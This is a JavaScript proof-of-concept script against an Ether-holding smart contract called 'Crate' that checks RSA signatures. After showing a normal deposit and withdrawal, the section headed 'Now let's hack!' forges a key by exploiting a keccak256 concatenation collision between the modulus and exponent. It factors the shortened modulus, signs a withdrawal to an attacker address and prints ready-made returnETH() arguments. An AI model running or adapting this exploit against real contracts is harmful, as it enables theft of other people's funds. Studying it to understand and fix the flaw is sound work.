const DCRSa = require('./signidice.js');
const web3_1  = require('web3');
const web3js  = new web3_1(web3_1.givenProvider);

function hex2array(hex) {
    if(hex.substr(0,2) == "0x"){
        hex = hex.substr(2)
    }
    if (hex.length % 2 !== 0) hex = "0" + hex;

    let res = [];
    for (i = 0; i < hex.length; i+=2) {
        res.push("0x" + hex.slice(i, i+2));
    }
    return res;
}

function asJSON(hex) {
    return "[\"" + hex2array(hex).join("\", \"") + "\"]"
}

let playerRSA = new DCRSa();
playerRSA.generate(512);

let N = playerRSA.RSA.n;
let e = playerRSA.RSA.e;

console.log("Let's imagine someone have generated RSA keys and sent public one to Crate smartcontract");
console.log("N", N.toString(16));
console.log("e", e.toString(16));
// console.log("p", playerRSA.RSA.p.toString(16));
// console.log("q", playerRSA.RSA.q.toString(16));
// console.log("d", playerRSA.RSA.d.toString(16));

let msg = "0x0000000000000000000000004b0897b0513fdc7c541b6d9d7e929c4e5364d2db";
//let msgHash = web3js.utils.soliditySha3(msg);
//console.log("Message hash", asJSON(msgHash));

let cipher = playerRSA.signHash(msg);
// console.log("Sign", cipher.toString(16));
// console.log("Check sign", playerRSA.verify(msg, cipher.toString(16)));

console.log("Args for submitPubKey()", asJSON(playerRSA.RSA.n.toString(16)),",", asJSON(playerRSA.RSA.e.toString(16)));
console.log("(Don't forget send some Ether too)\n");
console.log("Now, you can return your Ether from Crate by returnETH call");
console.log("This is a msg (address to return padded to 32 bytes)", msg);
console.log("This is a sign of addr", "0x" + cipher.toString(16));
console.log("Let's check the sign. Result is ", playerRSA.verify(msg, cipher.toString(16)));
console.log("Ok, args for returnETH() are", asJSON(msg),",",asJSON(playerRSA.RSA.n.toString(16)),",", asJSON(playerRSA.RSA.e.toString(16)) + "," + asJSON(cipher.toString(16)));
console.log("That's is usual way...")


console.log("\nNow let's hack!");
let bytes2cut = 2;
let newN = N.toString(16).slice(0, N.toString(16).length - bytes2cut);
let newE = N.toString(16).slice(N.toString(16).length - bytes2cut, N.toString(16).length) + "0" + e.toString(16);
console.log('Cause of keccak256("foo", "bar") == keccak256("fo", "obar"), we can cut N and find p and q for new N*');
console.log("New N", newN);
console.log("New e", newE);
console.log("Notice, new N is shorter than the previous one\n");
console.log("New N has multiple dividers. They can be computed at https://www.alpertron.com.ar/ECM.HTM e.g.");
p = '609dbb46adc57f706a399d8b13469d19e1f62f3585c1ec4235983c676fb86be4981e42c40e6c0af8188a76ca0ccbb';
q = ['05', 'e642659687', '54c7b45346aba588c1d1db5'];
console.log("p", p);
console.log("q", q);
console.log("Notice, I'm using biggest prime as p and multiplication of rest as q\n");

let cheaterRSA = new DCRSa(newE);
cheaterRSA.generateByPQ(p, q);
console.log("New secret key (d) is", cheaterRSA.RSA.d.toString(16));
let newMsg = "0x0000000000000000000000004b0897b0513fdc7c541b6d9d7e929c4e5364d2db";
console.log("New message (hacker addr)", newMsg);

let newCipher = cheaterRSA.signHash(newMsg);
console.log("Let's sign that with a new key d", newCipher.toString(16));
console.log("Check sign. Result is ", cheaterRSA.verify(newMsg, newCipher.toString(16)));

console.log("Final step!");
console.log("Args for returnETH()", asJSON(newMsg),",",asJSON(cheaterRSA.RSA.n.toString(16)),",", asJSON(cheaterRSA.RSA.e.toString(16)) + "," + asJSON(newCipher.toString(16)));
//console.log("Args for submitKey()", asJSON(cheaterRSA.RSA.n.toString(16)),",", asJSON(cheaterRSA.RSA.e.toString(16)));

